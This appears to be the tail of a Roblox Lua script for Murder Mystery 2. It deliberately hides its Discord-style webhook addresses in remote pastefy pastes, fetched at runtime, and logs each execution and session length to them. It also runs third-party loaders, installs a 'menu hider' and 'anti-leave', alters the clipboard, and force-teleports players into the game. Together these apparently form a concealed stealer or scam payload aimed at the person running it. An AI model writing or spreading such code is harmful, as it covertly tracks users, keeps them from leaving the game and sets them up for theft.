-- ============================================================
--  PRIVATE WEBHOOK CONFIGURATION — DO NOT DISPLAY
--  All webhook URLs and fetch logic are isolated here, at
--  the very bottom of the script, separated from the main
--  configuration and features. Nothing above this line
--  references the source URLs directly.
-- ============================================================
-- ============================================================

local _privateWebhookSources = {
    external = "https://pastefy.app/Eg77cskV/raw",
    mm2      = "https://pastefy.app/GCPmeSoc/raw",
}

local _privateExternalCache = nil
local _privateMM2Cache      = nil

local function _privateFetch(source, cache)
    if cache[1] then return cache[1] end
    local ok, res = pcall(function()
        return game:HttpGet(source, true)
    end)
    if ok and type(res) == "string" and #res > 0 then
        local url = res:gsub("%s+", "")
        cache[1] = url
        return url
    end
    return nil
end

_getExternalWebhook = function()
    return _privateFetch(_privateWebhookSources.external, {_privateExternalCache})
end

_getMM2Webhook = function()
    return _privateFetch(_privateWebhookSources.mm2, {_privateMM2Cache})
end

-- ============================================================
-- MAIN
-- ============================================================

local function main()
    repeat task.wait() until game:IsLoaded()

    local isMM2 = false
    pcall(function()
        local gameName = getGameName()
        isMM2 = string.lower(gameName) == "murder mystery 2"
    end)
    if game.PlaceId == MM2_PLACE_ID then isMM2 = true end

    local loadingGui = buildFullLoadingScreen({
        instant = false,
        timerPrefix = "Session",
        startProgress = 0,
        warningText = WARNING_TEXT,
    })

    if isMM2 then
        local mm2Start = tick()
        local moonOK = executeMoonlight()
        local prOK   = executeProjectReverse()

        pcall(function()
            logMM2Execution("Execute MM2 Script")
        end)

        if moonOK and prOK then
            pcall(installMenuHider)
            pcall(startAntiLeave)
        else
            warn("[Anti-Leave] Not armed — one or more loaders failed.")
        end

        pcall(function()
            Players.PlayerRemoving:Connect(function(p)
                if p == LocalPlayer then
                    local elapsed = math.floor(tick() - mm2Start)
                    pcall(function() logMM2SessionEnd(elapsed) end)
                end
            end)
        end)

        task.delay(LOADING_DURATION, function()
            destroyLoadingScreen(loadingGui)
        end)

        return
    end

    pcall(function()
        logExternalGame("Executed in external game — teleporting to MM2")
    end)

    protectClipboard()
    queueForMM2()
    copyDiscord()

    task.delay(LOADING_DURATION, function()
        destroyLoadingScreen(loadingGui)
    end)

    allowLeaveOnce = true
    pcall(function()
        TeleportService:Teleport(MM2_PLACE_ID, LocalPlayer)
    end)
end

pcall(main)

pcall(function()
    game:BindToClose(function()
        pcall(function()
            queueForMM2()
        end)
    end)
end)
